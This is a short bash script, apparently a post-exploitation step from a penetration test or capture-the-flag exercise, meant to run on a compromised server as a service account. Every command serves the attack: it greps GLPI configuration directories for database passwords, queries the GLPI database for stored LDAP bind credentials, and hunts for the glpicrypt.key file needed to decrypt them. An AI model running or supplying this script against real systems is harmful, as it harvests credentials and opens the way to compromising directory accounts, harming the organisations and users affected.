#!/usr/bin/env bash
# Run on the target as the service account (e.g. openam).
# 1) find GLPI DB password, 2) dump encrypted LDAP bind secret.
set -euo pipefail

echo "[*] Searching GLPI configs for DB credentials"
grep -rEi "dbpass|dbpassword|password" \
  /var/www/html/glpi/config/ /opt/glpi/config/ /etc/glpi/ 2>/dev/null || true

: "${GLPI_DBPASS:?export GLPI_DBPASS=<password from the grep above>}"

echo "[*] Dumping LDAP bind secrets"
mysql -h localhost -u glpi -p"${GLPI_DBPASS}" glpidb \
  -e "SELECT id, name, rootdn, rootdn_passwd FROM glpi_authldaps;"

echo "[*] Locating crypto key"
find / -name glpicrypt.key 2>/dev/null
